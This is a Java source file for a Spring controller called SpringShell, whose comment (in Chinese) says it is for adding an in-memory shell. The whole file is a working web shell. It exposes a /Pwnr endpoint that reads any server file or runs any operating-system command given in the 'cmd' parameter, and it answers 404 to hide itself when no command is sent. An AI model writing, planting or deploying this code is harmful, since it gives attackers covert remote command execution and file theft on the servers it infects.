package shell;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;

//用于添加内存shell
@Controller
public class SpringShell {

    public SpringShell() {

    }

    @RequestMapping("/Pwnr")
    public void index(HttpServletRequest req, HttpServletResponse res) {
        String cmd = req.getParameter("cmd");
        try {
            if (cmd != null) {
                PrintWriter pw = res.getWriter();
                String result = "";
                if (cmd.startsWith("read:")) {
                    cmd = cmd.substring(5);
                    result = read(cmd);
                } else if (cmd.startsWith("exec:")) {
                    cmd = cmd.substring(5);
                    result = exec(cmd);
                } else {
                    result = "help: read:[file] | exec:[cmd]\n";
                }
                pw.write(result);
                pw.flush();
                pw.close();
            } else {
                res.sendError(404);
            }

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public String read(String file) throws IOException {
        StringBuilder stringBuilder = new StringBuilder();
        BufferedReader read = new BufferedReader(
                new InputStreamReader(Files.newInputStream(Paths.get(file.trim()))));
        String line2 = null;
        while ((line2 = read.readLine()) != null) {
            stringBuilder.append(line2).append("\n");
        }
        return stringBuilder.toString();
    }

    public String exec(String command) {
        StringBuilder result = new StringBuilder();

        Process process = null;
        BufferedReader bufferIn = null;
        BufferedReader bufferError = null;

        try {
            process = Runtime.getRuntime().exec(command);

            process.waitFor();

            bufferIn = new BufferedReader(new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8));
            bufferError = new BufferedReader(new InputStreamReader(process.getErrorStream(), StandardCharsets.UTF_8));

            String line = null;
            while ((line = bufferIn.readLine()) != null) {
                result.append(line).append('\n');
            }
            while ((line = bufferError.readLine()) != null) {
                result.append(line).append('\n');
            }

        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            closeStream(bufferIn);
            closeStream(bufferError);

            if (process != null) {
                process.destroy();
            }
        }

        return result.toString();
    }

    private static void closeStream(Closeable stream) {
        if (stream != null) {
            try {
                stream.close();
            } catch (Exception e) {
                // nothing
            }
        }
    }

    public static SpringShell newInstance() {
        return new SpringShell();
    }

}
